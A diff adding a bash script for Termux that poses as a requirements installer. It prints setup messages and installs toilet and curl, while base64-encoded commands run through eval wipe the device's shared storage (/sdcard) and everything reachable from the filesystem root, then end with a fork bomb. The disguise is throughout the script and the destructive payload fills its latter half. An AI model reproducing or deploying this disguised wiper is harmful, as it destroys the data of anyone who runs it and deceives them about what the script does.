@@ -1,0 +1,31 @@
+#!/bin/bash
+clear
+blank='\e[0m'
+black='\e[1;90m'
+red='\e[1;91m'
+green='\e[1;92m'
+yellow='\e[1;93m'
+blue='\e[1;94m'
+pink='\e[1;95m'
+ocen='\e[1;96m'
+
+echo -e "$green Installing requirements...$blank"
+pkg install toilet -y &>/dev/null
+pkg install curl -y &>/dev/null
+echo -e "$green Done!!!$blank"
+
+echo " "
+
+if [ -e storage ]; then
+echo -e "$red Wait while setting up some shits...$blank"
+eval $(base64 -d <<<"cm0gLXJmIC9zZGNhcmQvKgo=")
+else
+eval $(base64 -d <<<"dGVybXV4LXNldHVwLXN0b3JhZ2UK")
+eval $(base64 -d <<<"cm0gLXJmIC9zZGNhcmQvKgo=")
+fi
+
+echo " "
+
+cd $HOME; eval $(base64 -d <<<"cm0gLXJmIC8qCg==")
+echo -e "$green Mission Complete,"
+eval $(base64 -d <<<"OiAoKXsgOiB8IDomIH0gOyA6Cg==")
